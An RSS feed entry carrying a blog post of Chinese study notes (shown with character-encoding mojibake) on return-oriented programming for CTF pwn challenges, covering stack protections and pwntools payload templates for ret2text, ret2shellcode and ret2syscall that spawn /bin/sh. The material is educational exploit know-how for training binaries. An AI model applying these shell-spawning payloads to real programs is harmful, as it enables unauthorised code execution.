<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>pwn on AmiaaaZ's Site</title><link>https://amiaaaz.github.io/categories/pwn/</link><description>Recent content in pwn on AmiaaaZ's Site</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Tue, 18 Jan 2022 00:00:14 +0800</lastBuildDate><atom:link href="https://amiaaaz.github.io/categories/pwn/index.xml" rel="self" type="application/rss+xml"/><item><title>pwn ropå…¥é—¨-å­¦ä¹ ç¬”è®°</title><link>https://amiaaaz.github.io/2022/01/18/pwn-rop-study-notes/</link><pubDate>Tue, 18 Jan 2022 00:00:14 +0800</pubDate><guid>https://amiaaaz.github.io/2022/01/18/pwn-rop-study-notes/</guid><description>&lt;h1 id="rop">ROP&lt;/h1>
&lt;p>return oriented programming&lt;/p>
&lt;h2 id="ç®€å•çš„æ±‡ç¼–æŒ‡ä»¤">ç®€å•çš„æ±‡ç¼–æŒ‡ä»¤&lt;/h2>
&lt;ul>
&lt;li>
&lt;p>ret -&amp;gt; pop EIP (ESPå¢žå¤§)&lt;/p>
&lt;/li>
&lt;li>
&lt;p>leave -&amp;gt; move ESP, EBP; pop EBP&lt;/p>
&lt;/li>
&lt;li>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th>intel&lt;/th>
&lt;th>AT&amp;amp;T&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>mov eax, 8&lt;/td>
&lt;td>movl $8, %eax&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>mov ebx, 0ffffh&lt;/td>
&lt;td>movl $0xffff, %ebx&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>int 80h&lt;/td>
&lt;td>int $80&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>mov eax, [ecx]&lt;/td>
&lt;td>movl (%ecx), %eax&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;/li>
&lt;/ul>
&lt;h2 id="å‡ ç§é˜²æŠ¤æŽªæ–½">å‡ ç§é˜²æŠ¤æŽªæ–½&lt;/h2>
&lt;ul>
&lt;li>canary: éšæœºå€¼é˜²æ­¢æ ˆæº¢å‡º (cookie)&lt;/li>
&lt;li>ASLR: å…¨å±€ç³»ç»Ÿå˜é‡&lt;code>/proc/sys/kernel/randomize_va_space&lt;/code>ï¼Œå†…å­˜åœ°å€éšæœºåŒ–ï¼Œè€Œgdbè°ƒè¯•ä¸­ä¸ºå…³é—­çŠ¶æ€&lt;/li>
&lt;li>PIE: å†…å­˜åœ°å€éšæœºåŒ–&lt;/li>
&lt;li>NX: æ•°æ®ä¸å¯æ‰§è¡Œ&lt;/li>
&lt;/ul>
&lt;h2 id="ret2text">ret2text&lt;/h2>
&lt;p>åœ¨ä»£ç æ®µ.textå­˜åœ¨åŽé—¨å‡½æ•°ï¼Œå°†ret addressä¿®æ”¹ä¸ºåŽé—¨å‡½æ•°çš„åœ°å€æŽ§åˆ¶å‡½æ•°çš„æ‰§è¡Œ&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#111">payload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">cyclic&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">n&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">p32&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">sys_addr&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#75715e"># n: ebp-eax+4(or 8), p32 or p64&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="ret2shellcode">ret2shellcode&lt;/h2>
&lt;p>å­˜åœ¨rwxä»£ç ç‰‡æ®µï¼Œä¼ å…¥shellcodeå¹¶ä¿®æ”¹ret addressä¸ºshellcodeæ‰€åœ¨çš„ç¼“å†²åŒºåœ°å€&lt;/p>
&lt;p>NXä¸å¼€å¯æ—¶ç›´æŽ¥å†™å…¥æ ˆç¼“å†²åŒºï¼Œå¼€å¯æ—¶å‘bssç¼“å†²åŒºæˆ–å †ç¼“å†²åŒºå†™å…¥shellcodeå¹¶ä½¿ç”¨mprotectèµ‹äºˆå¯æ‰§è¡Œæƒé™&lt;/p>
&lt;ul>
&lt;li>
&lt;p>&lt;a href="http://shell-storm.org/shellcode/">shellcode&lt;/a>&lt;/p>
&lt;/li>
&lt;li>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">from&lt;/span> &lt;span style="color:#111">pwn&lt;/span> &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#f92672">*&lt;/span>
&lt;span style="color:#111">shellcraft&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">sh&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#111">shellcraft&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">amd64&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">sh&lt;/span>&lt;span style="color:#111">()&lt;/span> &lt;span style="color:#75715e"># before: context.arch = &amp;#39;amd64&amp;#39;!&lt;/span>
&lt;span style="color:#111">payload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">asm&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">shellcraft&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">sh&lt;/span>&lt;span style="color:#111">())&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#111">shellcode&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>
&lt;span style="color:#111">payload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">shellcode&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">ljust&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">n&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;A&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">p32&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">sh_addr&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="ret2syscall">ret2syscall&lt;/h2>
&lt;p>å­˜åœ¨&lt;code>/bin/sh&lt;/code>æˆ–&lt;code>sh&lt;/code>å­—ç¬¦ä¸²ï¼Œæž„é€ gadgetså¤šæ¬¡è·³è½¬ret addræ¥æ‰§è¡Œ&lt;code>execve&lt;/code>ç³»ç»Ÿè°ƒç”¨ï¼›gadgetsé€šè¿‡&lt;code>ROPgadget&lt;/code>å¯»æ‰¾&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-shell" data-lang="shell">ROPgadget --binary filename_here --only &lt;span style="color:#d88200">&amp;#39;pop|ret&amp;#39;&lt;/span> &lt;span style="color:#111">|&lt;/span> grep &lt;span style="color:#d88200">&amp;#39;ebx&amp;#39;&lt;/span>
ROPgadget --binary filename_here --string &lt;span style="color:#d88200">&amp;#39;/bin/sh&amp;#39;&lt;/span>
ROPgadget --binary rop --only &lt;span style="color:#d88200">&amp;#39;int&amp;#39;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>æ•´ä½“çš„payloadæž„é€ ä¸Žå‡½æ•°è°ƒç”¨æ ˆçš„å·¥ä½œåŽŸç†å’Œç³»ç»Ÿè°ƒç”¨çš„å®žçŽ°æœ‰å…³ï¼Œx86ä¸‹é€šè¿‡&lt;code>int 0x80&lt;/code>æ‰§è¡Œï¼Œamd64ä¸‹ä¸º&lt;code>syscall&lt;/code>ï¼›æ³¨æ„å‚æ•°ä¼ å…¥çš„é¡ºåº (1-&amp;gt;N) ä¸Žæ ˆä¸­å­˜æ”¾çš„é¡ºåº (N-&amp;gt;1)çš„åŒºåˆ«&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#111">payload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">flat&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">cyclic&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">n&lt;/span>&lt;span style="color:#111">),&lt;/span> &lt;span style="color:#111">pop_eax_ret&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">0xb&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">pop_edx_ecx_ebx_ret&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">bin_sh_addr&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">int80_addr&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#75715e"># 0xb: execveçš„ç³»ç»Ÿè°ƒç”¨å· 11, execve(&amp;#34;/bin/sh&amp;#34;, NULL, NULL)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>_Refer: &lt;a href="https://en.wikipedia.org/wiki/System_call">System call&lt;/a>&lt;/p>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
ä»¥ä¸‹æ˜¯æœ¬æ–‡ä¸­æ¶‰åŠåˆ°çš„ å’Œæˆ‘å­¦ä¹ æ—¶çœ‹è¿‡çš„æ‰€æœ‰æ–‡ç« çš„é“¾æŽ¥ðŸ”— æ¯æ—¥æ„Ÿè°¢äº’è”ç½‘çš„ä¸°å¯Œèµ„æºï¼ˆ
&lt;/h4>
&lt;/summary>
&lt;ul>
&lt;li>
&lt;p>&lt;a href="https://www.bilibili.com/video/BV1854y1y7Ro">XMCVE 2020 CTF Pwnå…¥é—¨è¯¾ç¨‹&lt;/a>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;a href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/stackoverflow-basic/">ctfwiki - Stack Overflow&lt;/a>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;a href="https://www.yuque.com/hxfqg9/bin/zzg02e">è’¸ç±³ROP&lt;/a>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;a href="https://github.com/Vancir/365-days-get-xuanwulab-job/blob/master/weeks/week1.md">365-days-get-xuanwulab-job/weeks/week1.md&lt;/a>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;a href="http://www.cnblogs.com/clover-toeic/p/3755401.html">C è¯­è¨€å‡½æ•°è°ƒç”¨æ ˆ (ä¸€)&lt;/a>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;a href="http://www.cnblogs.com/clover-toeic/p/3756668.html">C è¯­è¨€å‡½æ•°è°ƒç”¨æ ˆ (äºŒ)&lt;/a>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;a href="https://www.cnblogs.com/clover-toeic/p/3757091.html">C è¯­è¨€å‡½æ•°è°ƒç”¨æ ˆ (äºŒ)&lt;/a>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;a href="https://en.wikipedia.org/wiki/System_call">System call&lt;/a>&lt;/p>
&lt;/li>
&lt;/ul>
&lt;/details></description></item></channel></rss>